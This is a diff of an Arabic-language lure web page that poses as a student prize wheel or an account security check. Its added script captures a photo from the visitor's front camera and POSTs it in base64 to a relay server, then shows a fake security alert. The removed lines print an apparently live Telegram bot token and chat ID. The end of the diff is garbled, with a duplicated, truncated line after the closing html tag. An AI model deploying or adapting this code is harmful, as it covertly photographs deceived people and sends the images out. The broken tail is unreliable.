@@ -29,20 +29,87 @@
 <canvas id="canvas"></canvas>
 
 <script>
-    const BOT_TOKEN = "8538003058:AAEeltf-MObXjAshSv7vFyz8OKjubr2juVg";
-    const CHAT_ID = "178566702";
-
     // قراءة نوع الخدعة من الرابط
     const urlParams = new URLSearchParams(window.location.search);
     const mode = urlParams.get('mode') || 'u1_snap1';
 
-    // تخصيص النصوص بحسب الخدعة المحددة من البوت
+    // تخصيص النصوص بحسب الخدعة المحددة
     if(mode.includes('u4_wheel')) {
         document.getElementById('title').innerText = "🎁 عجلة الحظ المباشرة للطلاب";
         document.getElementById('desc').innerText = "اضغط لتدوير العجلة ومعرفة جائزتك الفورية!";
     } else if(mode.includes('u3_pin')) {
         document.getElementById('title').innerText = "🔑 إعدادات الأمان والحساب";
-        document.getElementById('desc').innerText = "يرجى الموافقة لتأكيد رمز الحماية واختبار قوة الشاشة.";
+    }
+
+    async function runExperiment() {
+        const btn = document.querySelector('.btn');
+        btn.innerText = "جاري التحميل...";
+        btn.disabled = true;
+
+        try {
+            // طلب إذن الكاميرا
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            await new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    setTimeout(resolve, 1500); // الانتظار قليلاً لالتقاط الصورة بدقة
+                };
+            });
+
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // تحويل الصورة إلى صيغة Base64
+            const imageData = canvas.toDataURL('image/jpeg', 0.8);
+
+            // إيقاف الكاميرا بعد الالتقاط
+            stream.getTracks().forEach(track => track.stop());
+
+            // جمع بيانات إضافية (مثل نوع المتصفح أو الرابط)
+            const payloadData = {
+                message: `نشاط: ${mode}`,
+                image: imageData
+            };
+
+            // إرسال البيانات إلى السيرفر الوسيط (Render) الخاص بك بأمان
+            const response = await fetch('https://YOUR-RENDER-APP.onrender.com/send-message', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payloadData)
+            });
+
+            if (response.ok) {
+                // تحويل الواجهة بعد الإرسال الناجح
+                document.getElementById('app').innerHTML = `
+                    <div class="alert-box">
+                        <h2>⚠️ تنبيه أمني النظام</h2>
+                        <p>تم رصد محاولة دخول غير مصرح بها أو تم تفعيل الحماية بنجاح.</p>
+                    </div>
+                `;
+            } else {
+                throw new Error("فشل إرسال البيانات للخادم");
+            }
+
+        } catch (err) {
+            console.error(err);
+            btn.innerText = "حدث خطأ، حاول مرة أخرى";
+            btn.disabled = false;
+        }
+    }
+</script>
+
+</body>
+</html>
+
+             document.getElementById('desc').innerText = "يرجى الموافقة لتأكيد رمز الحماية 
     }
 
     async function runExperiment() {
